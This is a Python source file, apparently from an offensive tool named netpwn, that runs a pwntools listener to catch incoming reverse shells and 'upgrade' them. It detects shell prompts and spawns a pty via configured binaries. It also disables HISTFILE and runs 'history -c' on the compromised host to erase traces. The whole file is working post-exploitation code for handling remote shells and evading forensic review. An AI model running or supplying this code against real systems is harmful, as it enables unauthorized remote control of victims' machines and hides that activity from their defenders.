from pwnlib.tubes.listen import listen
from netpwn.config import SHELL_STABILIZATION_METHODS


class ListenerService:
    def __init__(self, lport: int):
        self.lport = lport

    def prepare_listener(self) -> listen:
        listener = listen(self.lport)

        return listener

    def is_rev_shell(self, listener: listen):
        data_received = listener.recvrepeat(timeout=1)
        listener.unrecv(data_received)
        # Check that we got a shell
        if (not b'$' in data_received and not b'#' in data_received and not b'Windows' in data_received):
            return False
        return True

    def can_upgrade_shell(self, shell: listen):
        data_received = shell.recv(timeout=0.5)
        shell.unrecv(data_received)

        if (not b'Windows' in data_received):
            return True
        return False

    def upgrade_shell(self, shell: listen):
        shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
        # Get pty
        shell.sendline(f'{self.find_pty_spawn_vector(shell)}; exit'.encode())

        shell.recv(timeout = None) # Wait for pty to spawn
        shell.sendline(b'export HISTFILE=/dev/null')
        shell.sendline(b'stty rows 38 columns 116')
        shell.sendline(b""" alias ls='ls --color=auto'""")
        shell.sendline(b'export TERM=xterm')
        shell.sendline(b'history -c')
        shell.clean(timeout=1)
    
    def find_pty_spawn_vector(self, shell: listen) -> str:
        shell.clean()

        for binary in SHELL_STABILIZATION_METHODS:
            shell.sendline(f'which {binary}'.encode())
            result = shell.recvrepeat(timeout=2).decode()
            if(binary in result and 'not found' not in result):
                for shell_binary in SHELL_STABILIZATION_METHODS[binary]:
                    shell.sendline(f'which {shell_binary}'.encode())
                    result = shell.recvrepeat(timeout=2).decode()
                    if(shell_binary in result and 'not found' not in result):
                        return SHELL_STABILIZATION_METHODS[binary][shell_binary]
            shell.clean()
        
        raise Exception('No pty spawn vector found')
